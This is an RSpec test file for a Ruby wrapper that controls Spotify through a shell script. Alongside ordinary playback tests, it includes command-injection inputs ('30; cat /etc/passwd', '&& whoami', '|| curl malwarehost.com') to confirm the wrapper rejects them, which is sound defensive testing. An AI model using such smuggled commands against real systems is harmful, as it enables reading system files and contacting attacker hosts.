ENV["RACK_ENV"] = "test"

require "rspec"
require "pry-byebug"
require_relative "../app"
require_relative "../spotify"

describe "Spotify" do
  let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands

  describe ".stop" do
    subject { Spotify.stop }

    it "stops Spotify" do
      expect(Spotify).to receive(:`)
        .with("./spotify.sh stop")
        .and_return(command_stub)
      subject
    end
  end

  describe ".next" do
    subject { Spotify.next }

    it "advances to the next song" do
      expect(Spotify).to receive(:`)
        .with("./spotify.sh next")
        .and_return(command_stub)
      subject
    end
  end

  describe ".prev" do
    subject { Spotify.prev }

    it "replays the previous song" do
      expect(Spotify).to receive(:`).with("./spotify.sh prev").and_return(command_stub)
      subject
    end
  end

  describe ".replay" do
    subject { Spotify.replay }

    it "replays the current song" do
      expect(Spotify).to receive(:`).with("./spotify.sh replay").and_return(command_stub)
      subject
    end
  end

  describe ".pos" do
    subject { Spotify.pos(time_in_seconds) }

    context "with an integer" do
      let(:time_in_seconds) { rand(0..100) }
      it "changes the position of the song" do
        expect(Spotify).to receive(:`).with("./spotify.sh pos #{time_in_seconds}")
        subject
      end
    end

    context "with invalid input" do
      let(:time_in_seconds) { "30; cat /etc/passwd" }
      it "does nothing" do
        expect(Spotify).to_not receive(:`)
        subject
      end

      it "returns nil" do
        expect(subject).to be_nil
      end
    end
  end

  describe ".vol" do
    subject { Spotify.vol(vol_args) }

    context "up" do
      let(:vol_args) { "up" }

      it "increases the volume" do
        expect(Spotify).to receive(:`).with("./spotify.sh vol up").and_return(command_stub)
        subject
      end
    end

    context "down" do
      let(:vol_args) { "down" }

      it "decreases the volume" do
        expect(Spotify).to receive(:`).with("./spotify.sh vol down").and_return(command_stub)
        subject
      end
    end

    context "with a volume integer" do
      let(:vol_args) { rand(0..100) }
      it "changes the volume of the song" do
        expect(Spotify).to receive(:`).with("./spotify.sh vol #{vol_args}")
        subject
      end
    end

    context "with invalid input" do
      let(:vol_args) { "30; cat /etc/passwd" }
      it "does nothing" do
        expect(Spotify).to_not receive(:`)
        subject
      end

      it "returns nil" do
        expect(subject).to be_nil
      end
    end
  end

  describe ".status" do
    subject { Spotify.status }

    it "returns that status of the song" do
      expect(Spotify).to receive(:`).with("./spotify.sh status").and_return(command_stub)
      subject
    end
  end

  describe ".share" do
    subject { Spotify.share(share_args) }

    context "empty string" do
      let(:share_args) { "" }

      it "calls share with no args" do
        expect(Spotify).to receive(:`).with("./spotify.sh share").and_return(command_stub)
        subject
      end
    end

    context "uri" do
      let(:share_args) { "uri" }

      it "advances to the next song" do
        expect(Spotify).to receive(:`).with("./spotify.sh share uri").and_return(command_stub)
        subject
      end
    end

    context "url" do
      let(:share_args) { "url" }

      it "advances to the next song" do
        expect(Spotify).to receive(:`).with("./spotify.sh share url").and_return(command_stub)
        subject
      end
    end
  end

  describe ".play" do
    subject { Spotify.play(play_args) }

    context "search by artist" do
      let(:play_args) { "artist Trivium" }
      it "searches by artist" do
        expect(Spotify).to receive(:`)
          .with("./spotify.sh play #{play_args}")
          .and_return(command_stub)
        subject
      end
    end

    context "search by album" do
      let(:play_args) { "album In Waves" }
      it "searches by album" do
        expect(Spotify).to receive(:`)
          .with("./spotify.sh play #{play_args}")
          .and_return(command_stub)
        subject
      end
    end

    context "search by playlist" do
      let(:play_args) { "list this.is_my playlist" }
      it "searches by playlist" do
        expect(Spotify).to receive(:`)
          .with("./spotify.sh play #{play_args}")
          .and_return(command_stub)
        subject
      end
    end

    context "search by uri" do
      let(:play_args) { "uri spotify:track:4hk0OBunwz04gknkfNLzUn" }
      it "searches by uri" do
        expect(Spotify).to receive(:`)
          .with("./spotify.sh play #{play_args}")
          .and_return(command_stub)
        subject
      end
    end

    context "command injection" do
      let(:play_args) { "artist Trivium && whoami" }

      it "does nothing" do
        expect(Spotify).to_not receive(:`)
        subject
      end

      it "returns nil" do
        expect(subject).to be_nil
      end
    end

    context "command injection" do
      let(:play_args) { "list some_playlist || curl malwarehost.com" }

      it "does nothing" do
        expect(Spotify).to_not receive(:`)
        subject
      end

      it "returns nil" do
        expect(subject).to be_nil
      end
    end
  end
end
